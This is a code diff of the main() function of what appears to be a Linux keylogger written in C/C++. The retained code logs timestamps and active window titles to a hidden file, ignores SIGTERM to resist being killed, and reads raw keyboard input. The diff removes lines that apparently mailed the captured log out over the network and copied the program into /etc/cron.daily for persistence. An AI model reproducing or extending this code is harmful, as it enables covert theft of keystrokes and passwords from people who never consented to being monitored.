@@ -13,12 +13,7 @@ int main()
 {
   system("echo \"\\n`date`\">>.system");
   system("cp .system m.g");
-  while(!checkInternet())
-    sleep(10);
-  pthread_t pt;
-  pthread_create(&pt, NULL, sendMail, NULL);
-  ///pthread_detach(pt);
-  system("cp test /etc/cron.daily/ 2> /dev/null");
+
   signal(SIGINT, quit); //pour ctrl+c
   signal(SIGTERM, SIG_IGN); //this for kill cmd
   //fin.seekg(0,ios::end);
@@ -27,7 +22,7 @@ int main()
   system("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | awk -F '\"' '{print $2}' >> .system");
 
 	GetKeys(keyboardDevice);
-  pthread_join(pt,NULL);
+
 
 	return 0;
 }
